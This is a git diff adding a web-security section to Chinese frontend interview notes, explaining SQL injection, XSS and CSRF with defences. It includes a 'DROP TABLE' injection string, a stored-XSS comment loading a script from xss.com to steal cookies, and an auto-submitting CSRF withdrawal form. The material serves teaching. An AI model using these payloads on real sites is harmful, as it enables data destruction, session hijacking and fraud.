@@ -292,6 +292,9 @@ const fib = (n) => {
 ## this简单区别
 ![this](./this.png)
 
+this代表当前this直属的函数的所属的对象
+
+
 ## 继承
 
 - 继承可以使得子类具有父类的各种属性和方法，而不需要再次编写相同的代码。在令子类别继承父类别的同时，可以重新定义某些属性，并重写某些方法，即覆盖父类别的原有属性和方法，使其获得与父类别不同的功能。
@@ -375,7 +378,7 @@ const throttle = (fn, wait) => {
 - node.onclick = function(e){}
 - node.addEventListener('click', function(e){})
 - 在函数里面可以使用事件对象 e
-- 函数里面的 this 代表 node 本身，如果用箭头函数则没有 this（this 指向 window）
+- ..函数里面的 this 代表 node 本身，如果用箭头函数则没有 this（this 指向 window）
 
 ## class 操作
 
@@ -565,3 +568,165 @@ console.log(data)
 - 命名冲突
 - 代码可读性
 - 代码复用性
+
+### Web安全
+#### Web常见的攻击有哪些（按照出现比例）
+- 跨站脚本XSS攻击
+- SQL注入
+- DOS攻击
+- 跨站伪造CSRF
+- 钓鱼网站
+
+#### DOS攻击
+- Denial-of-service attack。攻击者发送大量的请求，或者模拟大量合法用户的访问，占用服务器资源直至耗尽，使得真正有需求的用户无法访问。
+这种攻击一般由黑客控制的大量“肉鸡”在同一时间发起。对服务器来说，攻击者本身就是访问自己的“普通”用户，自己因无法承载如此多用户的请求而宕机。对于此类攻击防范成本极高。
+
+#### 钓鱼网站
+用户通过搜索引擎或者跳转链接进入仿冒(UI、域名和正版网站很相似)的网站，用户在仿冒仿站输入了用户名和密码，导致账户信息泄漏。
+
+#### SQL注入
+SQL注入是一种代码注入技术，攻击者可以将恶意SQL语句插入到输入字段中以执行。
+比如有这样一个功能：网站前端有一个查询输入框，输入用户输入的姓名查询并展示拥有该姓名的所有用户。当后端接收到查询参数后，做sql语句的拼接，然后执行sql，返回查询结果。
+
+```
+let userName = req.body.userName
+let sql = "SELECT * FROM users WHERE name = '" + userName + "';"
+exec(sql)
+```
+当用户输入的查询参数是这些字符时：
+```
+a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't
+```
+最终相当于执行
+```
+let sql = "SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';"
+```
+
+一次查询就能删库。当然也能做其他任何数据库操作。
+
+#### 应对措施
+- 方法1：使用ORM库，调用API，而不是直接运行SQL语句
+- 方法2：在运行SQL语句前对拼接的查询字段进行转义
+- 方法3：对数据库操作权限也做适当配置，比如不允许删库，能减小损失
+
+### XSS攻击
+Cross-site scripting (XSS) 。由于网站存在漏洞，使得攻击者可以在网站输入恶意代码，并让恶意代码在其他用户浏览器运行，窃取用户信息。
+
+#### 非持久型攻击
+1. 小花爱逛淘宝，在访问淘宝网时会输入用户名、密码进行登录，登录成功后浏览器和服务器分别保存认证Cookie用于识别小花的身份。
+2. 攻击者发现淘宝网的商品搜索栏有XSS漏洞：
+  a. 当攻击者在搜索栏搜索商品"手机"时，页面会展示“手机 100条查询结果”，页面的URL会变成 http://taobao.com/search?q=手机。
+  b. 当攻击者搜索“手机`<script>alert('xss')</script>`” 时，页面会展示“手机 100条查询结果”，同时页面会弹出Alert弹窗。 此时，攻击者就发现了该网站漏洞。
+3. 攻击者构造链接 “http://taobao.com/search?q=手机`<script>恶意代码</script>`” 并把链接通过各自社交平台发布，并配上诱人广告语：“淘宝女神节手机3折，仅限1000名用户”。
+4. 小花看到广告后，点开链接，发现确实进入淘宝官方网站，并没发现3折的手机，也没把这事放心上。
+5. 但实际上恶意代码已经在小花浏览器执行，因为小花的淘宝处于已登录状态，恶意代码可以获取小花的Cookie，也能“看”到小花的所有信息，并模拟小花的所有操作。
+
+#### 持久型攻击
+1. 攻击者发现淘宝的商品详情页的商品评论框有XSS漏洞
+2. 攻击者发了一条评论，内容是："宝贝物美价廉，买到就是赚到`<script src='http://xss.com/attack.js'>`"。这个消息会展示在评论列表，其中的script标签会潜入到页面
+3. 其他用户打开该商品详情页，阅读评论的同时实际上恶意代码已经在偷偷执行。攻击者会获取用户的Cookie劫持用户信息，也可以模拟用户再次发送包含恶意代码的评论，实现类似蠕虫病毒的传播模式。
+
+#### 防范措施
+1. 对富文本编辑器，过滤script等不安全标签
+2. 对用户输入进行转义，比如把`<script></script> `转义为 `&lt;script&gt;&lt;/script&gt`;
+3. 代码需要动态展示内容时用innerText 取代 innerHTML ，使用v-text取代 v-html，尽量少做HTML字符串拼接，禁止使用eval执行JS。
+4. 服务端Set Cookie时 带上HttpOnly字段，阻止JavaScript获取Cookie
+5. 对于上传图片的场景，禁止使用用户填写的图片地址。特别是Markdown编辑器。
+
+### CSRF攻击
+Cross-site request forgery, 跨站点请求伪造。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
+
+#### 攻击流程
+- 受害者登录http://a.com，并保留了登录凭证（Cookie）。
+- 攻击者引诱受害者访问了http://b.com。
+- http://b.com 向 http://a.com 发送了一个请求：http://a.com/act=xx。浏览器会默认携带http://a.com的Cookie。
+- http://a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
+- http://a.com以受害者的名义执行了act=xx。
+- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让http://a.com执行了自己定义的操作。
+
+#### 攻击类型
+- GET类型的CSRF
+
+一个常见的场景是匿名点赞，服务端会根据匿名访问者的IP来区分用户。攻击者把这个点赞接口集成到自己网站的图片里，任何人访问攻击者的网站都相当于给攻击者做了嫁衣帮忙点了一次赞。
+`<img src="http://zan.example/thumbup?amount=1&for=hacker" >`
+
+- POST类型的CSRF
+
+这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：
+```
+<form action="http://bank.example/withdraw" method=POST>
+    <input type="hidden" name="account" value="xiaoming" />
+    <input type="hidden" name="amount" value="10000" />
+    <input type="hidden" name="for" value="hacker" />
+</form>
+<script> document.forms[0].submit(); </script>
+```
+访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。
+POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。
+
+- 链接类型的CSRF
+
+比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：
+`<a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">重磅消息！！<a/>`
+由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。
+
+#### 防护方法
+- Referer判断
+
+根据Referer来判断请求来源。如果不在白名单，服务器忽略该请求。 该方法不可靠，Referer伪造太容易了
+
+- Samesite Cookie
+
+对于需要保护的Cookie，服务器在设置cookie时可以设置 Samesite的值，如
+`Set-Cookie: sid=1; Samesite=Strict`
+
+- Samesite=Strict。严格模式。假设b.com种下的Cookie设置Strict，当在a.com请求b.com的接口时不会带上Cookie，从a.com 打开一个b.com的链接，这个请求也不会带上cookie。
+- Samesite=Lax。宽松模式，新版Chrome的默认模式。假设b.com种下的Cookie设置Lax，当在a.com请求b.com的接口时不会带上Cookie，但从a.com 打开一个b.com的链接，这个请求会带上cookie。
+- Samesite=None。假设b.com种下的Cookie设置None，当在a.com请求b.com的接口时会带上Cookie，从a.com 打开一个b.com的链接，这个请求也会带上cookie。
+
+阻止了跨域Cookie，攻击者就没办法从第三方网站发起请求仿冒用户的身份了。
+
+- CSRF Token
+
+用户访问并登录b.com 时，服务器会写入Cookie，同时会在返回的HTML上埋点`<input type="hiden">`，比如
+```
+<form>
+	<input type="hiden" csrftoken="afe3f94jjfwr" >
+  <input type="text" name="username" value="">
+  <input type="password" name="password" value="">
+</form>
+```
+当用户提交表单或者发送Ajax请求时，在请求参数或者请求头带上之前埋入的csrftoken。请求到服务器后服务端会做验证，识别通过后才响应请求。
+
+因为这个token是埋在b.com里，攻击者从第三方网站伪造请求时得不到这个token，所以请求会失败。
+
+这种方式的优点是安全，缺点是服务端同时也要存储和维护token，比较麻烦。
+
+- 无需存储的CSRF Token
+
+用户访问并登录b.com 时，服务器会写入用于登录的Cookie。同时服务端会做两件事
+1. 在返回的HTML上埋点`<input type="hiden">`
+2. 在Cookie里写入该csrftoken值
+
+```
+<form>
+	<input type="hiden" csrftoken="afe3f94jjfwr" >
+  <input type="text" name="username" value="">
+  <input type="password" name="password" value="">
+</form>
+```
+
+`Set-Cookie: csrftoken=afe3f94jjfwr`
+
+当用户提交表单或者发送Ajax请求时，在请求参数或者请求头带上之前埋入的csrftoken。请求到服务器后服务端会从用户的请求参数里拿出token和请求自带的cookie里的token做比对，如果都存在且一致，则请求通过。
+
+因为这个token是埋在b.com里，攻击者从第三方网站伪造请求时得不到这个token，所以无法在请求参数里带上该token，请求会失败。
+
+
+### 300ms 延时
+
+所谓的300ms延迟，指的是用户在点击屏幕之后（在touchend事件触发后），等待300～400ms才触发click事件。
+
+页面总是能放大缩小。设置meta禁用页面缩放是无效的，比如即使页面加了`<meta name="viewport" content="user-scalable=no"> `依然能双指缩放，双击还原。
+只要页面处于放大状态，单击就一定有延迟；只要页面处于未放大的原始状态，单击就一定没有延迟。在一般情况下，不管是pc端页面还是移动端页面，不管有没有设置meta，不管有没有禁用缩放，用户打开页面默认就处于原始状态，是没有延迟的。当用户双指放大后，单击才出现延迟。
+
